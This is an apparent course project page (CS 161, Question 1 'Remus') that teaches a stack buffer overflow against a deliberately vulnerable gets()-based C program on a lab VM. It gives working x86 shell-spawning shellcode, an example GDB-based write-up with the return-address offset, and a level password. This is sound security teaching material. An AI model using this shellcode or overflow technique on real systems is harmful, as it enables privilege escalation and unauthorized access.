<!DOCTYPE html> <html lang="en-US"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=Edge"> <title>Question 1: Remus - CS 161 Project 1</title> <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"> <link rel="stylesheet" href="/assets/css/just-the-docs-default.css"> <script type="text/javascript" src="/assets/js/vendor/lunr.min.js"></script> <script type="text/javascript" src="/assets/js/just-the-docs.js"></script> <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Begin Jekyll SEO tag v2.7.1 --> <title>Question 1: Remus | CS 161 Project 1</title> <meta name="generator" content="Jekyll v3.9.0" /> <meta property="og:title" content="Question 1: Remus" /> <meta property="og:locale" content="en_US" /> <link rel="canonical" href="http://localhost:4000/question1.html" /> <meta property="og:url" content="http://localhost:4000/question1.html" /> <meta property="og:site_name" content="CS 161 Project 1" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="Question 1: Remus" /> <script type="application/ld+json"> {"headline":"Question 1: Remus","url":"http://localhost:4000/question1.html","@type":"WebPage","@context":"https://schema.org"}</script> <!-- End Jekyll SEO tag --> </head> <body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"> <title>Link</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"> <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"> <title>Search</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"> <title>Menu</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"> <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"> <title>Expand</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"> <polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"> <title>Document</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"> <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <div class="side-bar"> <div class="site-header"> <a href="http://localhost:4000/" class="site-title lh-tight"> CS 161 Project 1 </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a> </div> <nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"> <ul class="nav-list"><li class="nav-list-item"><a href="http://localhost:4000/story.html" class="nav-list-link">Story</a></li><li class="nav-list-item"><a href="http://localhost:4000/getting-started.html" class="nav-list-link">Getting Started</a></li><li class="nav-list-item"><a href="http://localhost:4000/customizing.html" class="nav-list-link">Customizing</a></li><li class="nav-list-item active"><a href="http://localhost:4000/question1.html" class="nav-list-link active">Question 1: Remus</a></li><li class="nav-list-item"><a href="http://localhost:4000/question2.html" class="nav-list-link">Question 2: Spica</a></li><li class="nav-list-item"><a href="http://localhost:4000/question3.html" class="nav-list-link">Question 3: Polaris</a></li><li class="nav-list-item"><a href="http://localhost:4000/question4.html" class="nav-list-link">Question 4: Vega</a></li><li class="nav-list-item"><a href="http://localhost:4000/question5.html" class="nav-list-link">Question 5: Deneb</a></li><li class="nav-list-item"><a href="http://localhost:4000/question6.html" class="nav-list-link">Question 6: Rigel</a></li><li class="nav-list-item"><a href="http://localhost:4000/submission.html" class="nav-list-link">Submission Summary</a></li></ul> </nav> <footer class="site-footer"> This site uses <a href="https://github.com/pmarsceill/just-the-docs">Just the Docs</a>, a documentation theme for Jekyll. </footer> </div> <div class="main" id="top"> <div id="main-header" class="main-header"> <div class="search"> <div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search CS 161 Project 1" aria-label="Search CS 161 Project 1" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label> </div> <div id="search-results" class="search-results"></div> </div> </div> <div id="main-content-wrap" class="main-content-wrap"> <div id="main-content" class="main-content" role="main"> <h1 class="no_toc" id="remus-launched-1975"> <a href="#remus-launched-1975" class="anchor-heading" aria-labelledby="remus-launched-1975"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Remus (Launched 1975) </h1> <ul> <li><em>Password</em>: ilearned</li> <li>(10 points)</li> </ul> <details open=""> <summary class="text-delta"> Table of contents </summary> <ol id="markdown-toc"> <li><a href="#starter-files" id="markdown-toc-starter-files">Starter files</a></li> <li><a href="#your-task" id="markdown-toc-your-task">Your task</a></li> <li><a href="#writing-the-exploit" id="markdown-toc-writing-the-exploit">Writing the Exploit</a></li> <li><a href="#example-write-up" id="markdown-toc-example-write-up">Example Write-Up</a> <ol> <li><a href="#main-idea" id="markdown-toc-main-idea">Main Idea</a></li> <li><a href="#magic-numbers" id="markdown-toc-magic-numbers">Magic Numbers</a></li> <li><a href="#exploit-structure" id="markdown-toc-exploit-structure">Exploit Structure</a></li> <li><a href="#exploit-gdb-output" id="markdown-toc-exploit-gdb-output">Exploit GDB Output</a></li> </ol> </li> <li><a href="#writing-the-egg-script" id="markdown-toc-writing-the-egg-script">Writing the <code class="language-plaintext highlighter-rouge">egg</code> Script</a></li> <li><a href="#debugging" id="markdown-toc-debugging">Debugging</a></li> <li><a href="#deliverables" id="markdown-toc-deliverables">Deliverables</a></li> </ol> </details> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Orion class satellites were some of the first to be launched into orbit. Once Gobian
Union’s proudest achievement, these satellites are now disused and ready to be
deorbited. CSA engineers recently deorbited the Orion-class satellite Romulus and
prepared a manual with instructions for hacking into the satellite.

Your job is to deorbit its sister satellite, Remus, using the provided manual. Old
satellites often have messages from the past in their README, so once you hack
into Remus, why not check out what the cosmonauts of the past had to say?
</code></pre></div></div> <p>To familiarize you with the workflow of this project, we will walk you through the exploit for the first question. This part has a lot of reading, but please read everything carefully to minimize silly mistakes in later questions!</p> <p>Log into the <code class="language-plaintext highlighter-rouge">remus</code> account on the VM using the password you obtained in the <a href="customizing.html">customization step above</a>.</p><hr /> <h2 id="starter-files"> <a href="#starter-files" class="anchor-heading" aria-labelledby="starter-files"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Starter files </h2> <p><code class="language-plaintext highlighter-rouge">ls</code> to see the provided files. Each user (one per question) will have the following files:</p> <ul> <li> <p>A vulnerable C program. In this question it is <code class="language-plaintext highlighter-rouge">orbit.c</code>.</p> </li> <li> <p>An executable binary of the C program. In this question it is <code class="language-plaintext highlighter-rouge">orbit</code>.</p> </li> <li> <p><code class="language-plaintext highlighter-rouge">exploit</code>: A scaffolding script that takes your malicious input and feeds it to the vulnerable program.</p> </li> <li> <p><code class="language-plaintext highlighter-rouge">debug-exploit</code>: A debugging version of the scaffolding script that takes your malicious input and starts GDB.</p> </li> <li> <p><code class="language-plaintext highlighter-rouge">README</code>: The file you want to read.</p> </li> <li> <p><code class="language-plaintext highlighter-rouge">egg</code>: Your malicious input to the program. You will need to create this file yourself.</p> </li> </ul><hr /> <h2 id="your-task"> <a href="#your-task" class="anchor-heading" aria-labelledby="your-task"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Your task </h2> <p>Try reading the contents of the <code class="language-plaintext highlighter-rouge">README</code> by using the <code class="language-plaintext highlighter-rouge">cat</code> command, which prints out the contents of a file: <code class="language-plaintext highlighter-rouge">cat README</code>. Notice that you do not have permission to read the file.</p> <p>The file permissions make each <code class="language-plaintext highlighter-rouge">README</code> accessible only to the next user. Luckily, each user has a compiled executable of the vulnerable C code that is owned by the next user. In other words, the vulnerable program will run with the next user’s effective privileges. Therefore, exploiting the C program will allow you to assume the next user’s permissions and see the contents of <code class="language-plaintext highlighter-rouge">README</code>.</p> <p>Your goal for each question is to provide a malicious input to the vulnerable C program in order to access the restricted <code class="language-plaintext highlighter-rouge">README</code> file, where you will find the username and password for the next question.</p><hr /> <h2 id="writing-the-exploit"> <a href="#writing-the-exploit" class="anchor-heading" aria-labelledby="writing-the-exploit"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Writing the Exploit </h2> <p>First, take a look at <code class="language-plaintext highlighter-rouge">orbit.c</code> and notice that it takes in user input. The scaffolding is designed so that whatever the <code class="language-plaintext highlighter-rouge">egg</code> script prints will be used as input to <code class="language-plaintext highlighter-rouge">orbit</code>.</p> <p>Your goal is to create an input that injects the following <em>shellcode</em> (<em>Shellcode</em> is x86 machine code which performs some action–typically spawning a shell for further attacker interaction.):</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> \
    <span class="s">"</span><span class="se">\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a</span><span class="s">"</span> <span class="o">+</span> \
    <span class="s">"</span><span class="se">\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f</span><span class="s">"</span> <span class="o">+</span> \
    <span class="s">"</span><span class="se">\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50</span><span class="s">"</span> <span class="o">+</span> \
    <span class="s">"</span><span class="se">\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80</span><span class="s">"</span>
</code></pre></div></div> <p><strong>Note</strong>: You will use this same shellcode for Questions 1, 2, 4, and 6.</p> <p>A correct exploit will launch a new shell waiting for input - you can verify that your exploit works by checking that <code class="language-plaintext highlighter-rouge">cat README</code> displays the next password.</p> <p>To help you out, we have provided an example write-up on the next two pages. You will need to submit your own write-ups for the rest of the questions. Each question’s writeup should contain:</p> <ul> <li> <p>A description of the vulnerability and the exploit</p> </li> <li> <p>How any relevant “magic numbers” were determined</p> </li> <li> <p>gdb output demonstrating the before/after of the exploit working</p> </li> </ul> <p>With the help of the example write-up, write out the input that will cause <code class="language-plaintext highlighter-rouge">orbit</code> to spawn a shell. A video demo is also available at <a href="https://cs161.org/lecture?kaltura_video_id=1_x2y2igh7">this link</a>.</p> <p><strong>Note:</strong> the example will have been customized differently, so you will need to follow the steps to find the correct addresses for your customized VM.</p><hr /> <h2 id="example-write-up"> <a href="#example-write-up" class="anchor-heading" aria-labelledby="example-write-up"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Example Write-Up </h2> <h3 id="main-idea"> <a href="#main-idea" class="anchor-heading" aria-labelledby="main-idea"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Main Idea </h3> <p>The code is vulnerable because <code class="language-plaintext highlighter-rouge">gets(buf)</code> does not check the length of the input from the user, which lets an attacker write past the end of the buffer. We insert shellcode above the saved return address on the stack (rip) and overwrite the rip with the address of shellcode.</p> <h3 id="magic-numbers"> <a href="#magic-numbers" class="anchor-heading" aria-labelledby="magic-numbers"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Magic Numbers </h3> <p>We first determined the address of the buffer (<font color="blue">0xbffffc18</font>) and the address of the rip of the <code class="language-plaintext highlighter-rouge">orbit</code> function (<font color="red">0xbffffc2c</font>). This was done by invoking GDB and setting a breakpoint at line 5.</p> <div class="language-plaintext highlighter-rouge"> <div class="highlight"><pre class="highlight"><code>(gdb) x/16x buf
<font color="blue">0xbffffc18</font>:  0x41414141  0xb7e5f200  0xb7fed270  0x00000000
0xbffffc28:  0xbffffc18  0x0804842a  0x08048440  0x00000000
0xbffffc38:  0x00000000  0xb7e454d3  0x00000001  0xbffffcb4
0xbffffc48:  0xbffffcbc  0xb7fdc858  0x00000000  0xbffffc1c

(gdb) i f
Stack frame at 0xbffffc10:
 eip = 0x804841d in orbit (orbit.c:8); saved eip 0x804842a
 called by frame at 0xbffffc40
 source language c.
 Arglist at 0xbffffc28, args:
 Locals at 0xbffffc28, Previous frame's sp is 0xbffffc30
 Saved registers:
  ebp at 0xbffffc28, eip at <font color="red">0xbffffc2c</font>
</code></pre></div></div> <p>By doing so, we learned that the location of the return address from this function was 20 bytes away from the start of the buffer (<font color="blue">0xbffffc18</font> - <font color="red">0xbffffc2c</font> = 20).</p> <h3 id="exploit-structure"> <a href="#exploit-structure" class="anchor-heading" aria-labelledby="exploit-structure"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploit Structure </h3> <p>Here is the stack diagram (<em>You don’t need a stack diagram in your writeup</em>).</p> <div class="table-wrapper"><table> <tbody> <tr> <td>rip (<code class="language-plaintext highlighter-rouge">0xbffffc2c</code>)</td> </tr> <tr> <td>sfp</td> </tr> <tr> <td>compiler padding</td> </tr> <tr> <td>buf (<code class="language-plaintext highlighter-rouge">0xbffffc18</code>)</td> </tr> </tbody> </table></div> <p>The exploit has three parts:</p> <ol> <li> <p>Write 20 dummy characters to overwrite <code class="language-plaintext highlighter-rouge">buf</code>, the compiler padding, and the sfp.</p> </li> <li> <p>Overwrite the rip with the address of shellcode. Since we are putting shellcode directly after the rip, we overwrite the rip with <code class="language-plaintext highlighter-rouge">0xbffffc30</code> (<code class="language-plaintext highlighter-rouge">0xbffffc2c + 4</code>).</p> </li> <li> <p>Finally, insert the shellcode directly after the rip.</p> </li> </ol> <p>This causes the <code class="language-plaintext highlighter-rouge">orbit</code> function to start executing the shellcode at address <code class="language-plaintext highlighter-rouge">0xbffffc30</code> when it returns.</p> <h3 id="exploit-gdb-output"> <a href="#exploit-gdb-output" class="anchor-heading" aria-labelledby="exploit-gdb-output"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploit GDB Output </h3> <p>When we ran GDB after inputting the malicious exploit string, we got the following output:</p> <div class="language-plaintext highlighter-rouge"> <div class="highlight"><pre class="highlight"><code>(gdb) x/16x buf
0xbffffc18:  <font color="blue">0x61616161  0x61616161  0x61616161  0x61616161</font>
0xbffffc28:  <font color="blue">0x61616161</font>  <font color="red">0xbffffc30</font>  <font color="green">0xcd58326a 0x89c38980</font>
0xbffffc38:  <font color="green">0x58476ac1  0xc03180cd  0x2f2f6850  0x2f686873</font>
0xbffffc48:  <font color="green">0x546e6962  0x8953505b  0xb0d231e1  0x0080cd0b</font>
</code></pre></div></div> <p>After 20 bytes of garbage (<font color="blue">blue</font>), the rip is overwritten with <code class="language-plaintext highlighter-rouge">0xbffffc30</code> (<font color="red">red</font>), which points to the shellcode directly after the rip (<font color="green">green</font>).</p> <p>Note: you don’t need to color-code your gdb output in your writeup.</p><hr /> <h2 id="writing-the-egg-script"> <a href="#writing-the-egg-script" class="anchor-heading" aria-labelledby="writing-the-egg-script"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Writing the <code class="language-plaintext highlighter-rouge">egg</code> Script </h2> <p>To integrate your solution with the <code class="language-plaintext highlighter-rouge">exploit</code> scaffold, we want the <code class="language-plaintext highlighter-rouge">egg</code> script to output your malicious input to the C program. This can be done in any scripting language you want, but we recommend Python 2 (not 3, because of <a href="https://medium.com/@andreacolangelo/strings-unicode-and-bytes-in-python-3-everything-you-always-wanted-to-know-27dc02ff2686">the distinction between unicode bytes and strings</a>).</p> <p>First, create a blank <code class="language-plaintext highlighter-rouge">egg</code> file. (<code class="language-plaintext highlighter-rouge">touch egg</code> will do the job.) Give the file permission to be run as an executable script by running <code class="language-plaintext highlighter-rouge">chmod +x egg</code>.</p> <p><strong>In this project, you will need to <code class="language-plaintext highlighter-rouge">chmod</code> any new scripts you create.</strong></p> <p>Since the <code class="language-plaintext highlighter-rouge">egg</code> executable doesn’t have a file extension, the shell won’t know what type of code it contains. To indicate that this is a Python file, we will include a <a href="https://en.wikipedia.org/wiki/Shebang_(Unix)">shebang line</a> at the top of the <code class="language-plaintext highlighter-rouge">egg</code> file:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python2</span>
</code></pre></div></div> <p><strong>In this project, you will need to add shebangs to any script you create.</strong></p> <p>The rest of the script should print your malicious input to stdout, so that <code class="language-plaintext highlighter-rouge">exploit</code> can feed it to <code class="language-plaintext highlighter-rouge">orbit</code>. A simple <code class="language-plaintext highlighter-rouge">print</code> statement does the job in Python.</p><hr /> <h2 id="debugging"> <a href="#debugging" class="anchor-heading" aria-labelledby="debugging"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Debugging </h2> <p>If your exploit doesn’t work, you can use gdb to debug it. To do this, we will need to use the IO operators (<code class="language-plaintext highlighter-rouge">&lt;</code> and <code class="language-plaintext highlighter-rouge">&gt;</code>) to redirect input and output.</p> <p>Recall that <code class="language-plaintext highlighter-rouge">&lt;</code> is used for <em>input</em> redirection, and uses the righthand-side as the lefthand-side’s input. <code class="language-plaintext highlighter-rouge">&gt;</code> is used for <em>output</em> redirection, and sends the lefthand-side’s output to the righthand-side.</p> <p>First, we will run <code class="language-plaintext highlighter-rouge">egg</code> and save its output into a file <code class="language-plaintext highlighter-rouge">foo.txt</code>:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nv">$ </span>./egg <span class="o">&gt;</span> foo.txt
</code></pre></div></div> <p>Then, we will open the debugger with <code class="language-plaintext highlighter-rouge">./debug-exploit</code>. After you’re finished running <code class="language-plaintext highlighter-rouge">layout split</code> and setting breakpoints, run the following command in gdb to start the program:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="o">(</span>gdb<span class="o">)</span> r &lt; foo.txt
</code></pre></div></div> <p>From here, you can use gdb as you normally would, and any calls for input will read from the <code class="language-plaintext highlighter-rouge">foo.txt</code> file you created.</p> <p><strong>Note</strong>: Recall that x86 is <a href="http://en.wikipedia.org/wiki/Endianness">little-endian</a> so the first four bytes of the shellcode will appear as <code class="language-plaintext highlighter-rouge">0xcd58326a</code> in the debugger. To write <code class="language-plaintext highlighter-rouge">0x12345678</code> to memory, use <code class="language-plaintext highlighter-rouge">\x78\x56\x34\x12</code>.</p><hr /> <h2 id="deliverables"> <a href="#deliverables" class="anchor-heading" aria-labelledby="deliverables"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Deliverables </h2> <p>A script <code class="language-plaintext highlighter-rouge">egg</code>. No writeup required for this question only.</p> <p>We recommend you test each of your scripts against the autograder (see the <a href="submission.html">submission instructions</a> in order to debug potential issues before the project deadline.</p><hr /> <p><img src="/images/outward.jpg" alt="outward" /></p> </div> </div> <div class="search-overlay"></div> </div> </body> </html>
